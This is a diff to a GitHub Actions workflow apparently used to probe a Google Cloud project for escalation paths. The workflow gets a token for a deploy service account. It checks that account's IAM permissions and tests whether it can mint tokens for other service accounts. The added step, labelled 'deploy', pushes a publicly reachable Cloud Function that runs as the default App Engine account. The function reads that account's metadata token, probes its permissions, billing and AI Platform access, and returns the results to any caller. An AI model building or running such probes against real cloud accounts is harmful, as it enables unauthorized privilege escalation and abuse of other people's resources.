@@ -1,4 +1,4 @@
-name: wif-probe3
+name: wif-probe4
 on: push
 permissions:
   contents: read
@@ -12,22 +12,63 @@ jobs:
         with:
           workload_identity_provider: projects/956073807168/locations/global/workloadIdentityPools/my-pool/providers/my-provider
           service_account: deploy-cloud-functions@nutmeg-9099c.iam.gserviceaccount.com
-      - name: perms
+      - name: deploy
         run: |
-          T=$(gcloud auth print-access-token 2>/dev/null); echo "TOKLEN=${#T}"; P=nutmeg-9099c
-          tip() { curl -s -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "$2" "$1"; echo; }
-          echo "=== PERMS_PROJECT ==="
-          tip "https://cloudresourcemanager.googleapis.com/v1/projects/$P:testIamPermissions" '{"permissions":["iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccounts.getOpenIdToken","iam.serviceAccountKeys.create","iam.serviceAccounts.create","iam.serviceAccounts.delete","iam.serviceAccounts.setIamPolicy","iam.roles.list","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.enable","serviceusage.services.list","serviceusage.services.get","serviceusage.quotas.get","compute.instances.create","compute.instances.setMetadata","compute.instances.list","compute.instances.get","compute.disks.create","compute.networks.create","compute.projects.get","compute.zones.list","compute.acceleratorTypes.list","container.clusters.create","container.clusters.getCredentials","container.clusters.list","cloudfunctions.functions.create","cloudfunctions.functions.update","cloudfunctions.functions.list","cloudfunctions.functions.get","run.services.create","run.services.update","cloudbuild.builds.create","artifactregistry.repositories.create","storage.buckets.create","storage.buckets.list","storage.objects.create","aiplatform.customJobs.create","aiplatform.customJobs.list","aiplatform.endpoints.create","aiplatform.models.upload","aiplatform.pipelineJobs.create","tpu.nodes.create","tpu.nodes.list","deploymentmanager.deployments.create","secretmanager.secrets.create","secretmanager.versions.access","dataproc.clusters.create","dataflow.jobs.create","pubsub.topics.create","bigquery.datasets.create"]}'
-          for sa in nutmeg-9099c@appspot.gserviceaccount.com 956073807168-compute@developer.gserviceaccount.com github-action-364918749@nutmeg-9099c.iam.gserviceaccount.com nutmeg-deploy@nutmeg-9099c.iam.gserviceaccount.com; do
-            echo "=== SA $sa ==="
-            tip "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$sa:testIamPermissions" '{"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccountKeys.create"]}'
+          set -u
+          T=$(gcloud auth print-access-token 2>/dev/null); echo "TOKLEN=${#T}"
+          P=nutmeg-9099c; L=europe-central2; F=sa-perm-probe
+          mkdir -p src && cat > src/main.py <<'PY'
+          import json, urllib.request
+          def probe(request):
+              out = {}
+              try:
+                  r = urllib.request.Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor': 'Google'})
+                  tok = json.load(urllib.request.urlopen(r, timeout=10))['access_token']
+                  out['toklen'] = len(tok)
+                  perms = ["aiplatform.customJobs.create","compute.instances.create","compute.instances.setMetadata","container.clusters.getCredentials","serviceusage.services.enable","iam.serviceAccounts.actAs","resourcemanager.projects.getIamPolicy","cloudfunctions.functions.create","storage.buckets.create","cloudbuild.builds.create","run.services.create","appengine.apps.get","iam.serviceAccounts.getAccessToken"]
+                  req = urllib.request.Request('https://cloudresourcemanager.googleapis.com/v1/projects/nutmeg-9099c:testIamPermissions', data=json.dumps({'permissions': perms}).encode(), headers={'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'}, method='POST')
+                  out['perms'] = json.load(urllib.request.urlopen(req, timeout=15))
+              except Exception as e:
+                  out['perms_err'] = repr(e)
+              try:
+                  req = urllib.request.Request('https://cloudbilling.googleapis.com/v1/projects/nutmeg-9099c/billingInfo', headers={'Authorization': 'Bearer ' + tok})
+                  out['billing'] = json.load(urllib.request.urlopen(req, timeout=15))
+              except Exception as e:
+                  out['billing_err'] = repr(e)
+              try:
+                  req = urllib.request.Request('https://us-central1-aiplatform.googleapis.com/v1/projects/nutmeg-9099c/locations/us-central1/customJobs?pageSize=2', headers={'Authorization': 'Bearer ' + tok})
+                  out['aiplat'] = urllib.request.urlopen(req, timeout=20).read().decode()[:400]
+              except Exception as e:
+                  out['aiplat_err'] = repr(e)
+              return (json.dumps(out), 200, {'Content-Type': 'application/json'})
+          PY
+          python3 - <<'PY'
+          import zipfile
+          z = zipfile.ZipFile('f.zip', 'w', zipfile.ZIP_DEFLATED)
+          z.write('src/main.py', 'main.py'); z.close()
+          print('zip bytes', __import__('os').path.getsize('f.zip'))
+          PY
+          U=$(curl -s -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{}' "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions:generateUploadUrl" | python3 -c 'import json,sys;print(json.load(sys.stdin)["uploadUrl"])')
+          echo "uploadUrl_ok=${#U}"
+          UP=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H 'Content-Type: application/zip' --data-binary @f.zip "$U")
+          echo "upload_http=$UP"
+          BODY=$(python3 -c "
+import json,sys
+print(json.dumps({'name':'projects/$P/locations/$L/functions/$F','entryPoint':'probe','runtime':'python312','availableMemoryMb':256,'timeout':'60s','serviceAccountEmail':'nutmeg-9099c@appspot.gserviceaccount.com','httpsTrigger':{'securityLevel':'SECURE_OPTIONAL'},'sourceUploadUrl':sys.argv[1],'ingressSettings':'ALLOW_ALL'}))" "$U")
+          echo "=== CREATE ==="
+          curl -s -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "$BODY" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions"; echo
+          for i in $(seq 1 40); do
+            S=$(curl -s -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions/$F")
+            ST=$(echo "$S" | python3 -c 'import json,sys
+try: print(json.load(sys.stdin).get("status","?"))
+except Exception: print("parse")')
+            echo "poll $i status=$ST"
+            if [ "$ST" = "ACTIVE" ]; then break; fi
+            if [ "$ST" = "?" ] || [ "$ST" = "parse" ]; then echo "$S" | head -c 400; fi
+            sleep 8
           done
-          echo "=== GEN_APPSPOT ==="
-          curl -s -o /tmp/g1 -w 'HTTP=%{http_code} ' -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{"lifetime":"600s"}' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/nutmeg-9099c@appspot.gserviceaccount.com:generateAccessToken"; head -c 160 /tmp/g1; echo
-          echo "=== FUNCTIONS_LIST ==="
-          curl -s -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/-/functions"; echo
-          echo "=== GAE_APPS ==="
-          curl -s -H "Authorization: Bearer $T" "https://appengine.googleapis.com/v1/apps/$P"; echo
-          echo "=== STORAGE_BUCKETS ==="
-          curl -s -H "Authorization: Bearer $T" "https://storage.googleapis.com/storage/v1/b?project=$P&maxResults=20"; echo
+          echo "=== FUNCTION ==="
+          curl -s -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/$L/functions/$F" | head -c 900; echo
+          echo "=== INVOKE ==="
+          curl -s -m 60 "https://$L-$P.cloudfunctions.net/$F" | head -c 2000; echo
           echo "=== END ==="
